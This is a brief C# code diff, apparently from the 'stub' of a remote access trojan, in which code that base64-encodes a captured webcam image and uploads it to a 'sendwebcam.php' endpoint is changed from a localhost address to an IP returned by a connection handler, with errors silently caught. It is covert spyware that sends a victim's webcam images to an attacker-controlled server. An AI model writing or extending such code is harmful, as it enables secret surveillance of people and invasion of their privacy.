@@ -69,7 +69,7 @@ namespace stub
                     nameValues.Add("webcam", Convert.ToBase64String(upload.ToArray()));
 
 
-                    wc.UploadValues("http://127.0.0.1/sendwebcam.php", nameValues);
+                    wc.UploadValues("http://" + ConnectionIPHandler.GetIP() + "/sendwebcam.php", nameValues);
                     onlyOnce = true;
                 }
                 catch { }
